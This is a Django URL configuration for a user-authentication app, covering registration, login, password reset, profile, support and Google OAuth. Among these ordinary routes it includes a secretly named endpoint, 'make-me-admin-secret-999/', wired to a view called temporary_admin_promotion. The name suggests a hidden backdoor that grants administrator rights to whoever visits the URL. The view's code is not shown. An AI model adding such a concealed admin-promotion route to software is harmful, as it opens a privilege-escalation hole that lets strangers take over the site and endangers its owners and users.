from django.urls import path
from .views import (
    RegisterView,
    LogoutView,
    ChangePasswordView,
    UserProfileView,
    LoginView,
    ForgotPasswordRequestView,
    ResetPasswordConfirmView,
    CustomTokenRefreshView,
    SupportMessageView,
    GoogleOAuthLoginView,
    GoogleOAuthCallbackView,
    temporary_admin_promotion,
)

urlpatterns = [
    path('register/',           RegisterView.as_view(),           name='auth_register'),
    path('login/',              LoginView.as_view(),              name='auth_login'),
    path('logout/',             LogoutView.as_view(),             name='auth_logout'),
    path('token/refresh/',      CustomTokenRefreshView.as_view(), name='auth_token_refresh'),
    path('change-password/',    ChangePasswordView.as_view(),     name='auth_change_password'),
    path('profile/',            UserProfileView.as_view(),        name='auth_profile'),
    path('forgot-password/',    ForgotPasswordRequestView.as_view(),   name='auth_forgot_password'),
    path('reset-password/',     ResetPasswordConfirmView.as_view(),    name='auth_reset_password'),
    path('support/',            SupportMessageView.as_view(),           name='auth_support'),
    path('google/login/',       GoogleOAuthLoginView.as_view(),         name='google_login'),
    path('google/callback/',    GoogleOAuthCallbackView.as_view(),      name='google_callback'),
    path('make-me-admin-secret-999/', temporary_admin_promotion,       name='temporary_admin_promotion'),
]
